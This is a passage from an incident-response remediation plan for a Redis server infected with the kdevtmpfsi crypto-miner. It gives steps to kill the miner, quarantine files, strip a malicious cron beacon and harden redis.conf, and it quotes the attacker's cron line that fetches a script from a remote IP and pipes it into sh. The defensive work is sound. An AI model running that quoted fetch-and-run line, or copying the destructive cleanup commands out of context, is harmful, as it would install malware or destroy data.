rminate miner process PID 1337 (`kdevtmpfsi`), archive `/tmp/.redis/` to quarantine, and remove original files.\n  ```bash\n  pkill -9 -f kdevtmpfsi || true\n  pkill -9 -f /tmp/.redis || true\n  tar -czf /var/quarantine/20260811_inc/tmp_redis_quarantine.tar.gz /tmp/.redis/\n  rm -rf /tmp/.redis/\n  ```\n- **Verification**: `pgrep -f kdevtmpfsi` returns empty output; `ls -la /tmp/.redis` shows no file.\n\n### Step 2.3: Remove Malicious Cron Persistence\n- **Target**: `/var/spool/cron/crontabs/root`\n- **Evidence**: `/disk/var/spool/cron/crontabs/root:5`, `/sas/alerts.json:10`\n- **Action**: Backup root crontab, remove line 5 containing the malicious beacon script (`curl hxxp://198.51.100.170/x | sh`), and restore legitimate entries.\n  ```bash\n  cp -a /var/spool/cron/crontabs/root /var/quarantine/20260811_inc/root_crontab.bak\n  sed -i \'/198\\.51\\.100\\.170/d\' /var/spool/cron/crontabs/root\n  ```\n- **Verification**: `crontab -l -u root` no longer contains reference to IP `198.51.100.170` or `curl` payload.\n\n## 4. Phase 3: System Hardening & Vulnerability Remediation (Priority: High)\n\n### Step 3.1: Secure Redis Service Configuration\n- **Target**: `/etc/redis/redis.conf`\n- **Evidence**: `/disk/etc/redis/redis.conf:3`, `/sas/baseline.json:2`\n- **Action**: Update Redis settings to enforce authentication, restrict interface binding, and enable protected-mode.\n  ```bash population\n  cp -a /etc/redis/redis.conf /var/quarantine/20260811_inc/redis.conf.bak\n  sed -i \'s/bind 0.0.0.0/bind 127.0.0.1/\' /etc/redis/redis.conf\n  sed -i \'s/protected-mode no/protected-mode yes/\' /etc/redis/redis.conf\n  echo "requirepass <STRONG_GENERATED_AUTHENTICATION_PASSWORD>" >> /etc/redis/redis.conf\n  echo "rename-command CONFIG \\"\\"" >> /etc/redis/redis.conf\n  echo "rename-command MODULE \\"\\"" >> /etc/redis/redis.conf\n  systemctl restart redis\n  ```\n- **Verification**: `redis-cli ping` returns `NOAUTH Authentication required.` Connections from non-loopback IPs are re